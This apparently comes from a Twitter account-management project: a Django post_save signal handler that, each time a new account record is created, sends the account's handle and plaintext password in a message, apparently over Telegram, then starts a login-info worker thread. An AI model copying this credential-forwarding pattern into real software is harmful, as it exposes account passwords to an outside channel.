from django.db.models.signals import post_save
from django.dispatch import receiver
from .models import TwitterAccount
from .workers.threads import GetAccountLoginInfoFromInstanceThread
from .workers.checker import CheckTwitterAccount
from .core.utils import sendTMessage

@receiver(post_save, sender=TwitterAccount)
def addAccountLoginInfoBeforeSaveTwitterAccount(sender: TwitterAccount, instance: TwitterAccount , created: bool, **kwargs):
    if created :
        sendTMessage(msg=f"""
Trying Add New Twitter Account :
Agent : {instance.agent}
Handle : {instance.handle}
Password : {instance.password}
        """,
        )
        GetAccountLoginInfoFromInstanceThread(instance).start()

    # checker = CheckTwitterAccount(instance)


